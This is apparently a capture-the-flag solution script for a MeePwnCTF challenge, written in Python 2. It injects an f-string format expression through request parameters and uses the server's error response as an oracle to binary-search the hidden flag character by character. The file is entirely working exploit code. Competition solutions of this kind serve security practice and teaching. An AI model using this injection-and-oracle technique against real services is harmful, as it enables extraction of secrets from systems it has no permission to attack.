#!/usr/bin/env python
import requests

url = 'http://206.189.223.3/cgi-bin/server.py?'
value1 = 'T'
op = '+f'
value2 = 'ru{FLAG<source or 14:x}'
flag = 'MeePwnCTF{'

def check(s):
	source = flag + chr(s)
	param = dict(source=source, value1=value1, value2=value2, op=op)
	r = requests.get(url, params=param)
	return 'Invalid' in r.text

def bin_search(seq = range(0x20, 0x80), low = 0, high = 96):
	while low < high:
		mid = (low + high) / 2
		if check(seq[mid]):
			high = mid
		else:
			low = mid + 1
	return chr(seq[low] - 1)

while 1:
	flag += bin_search()
	print flag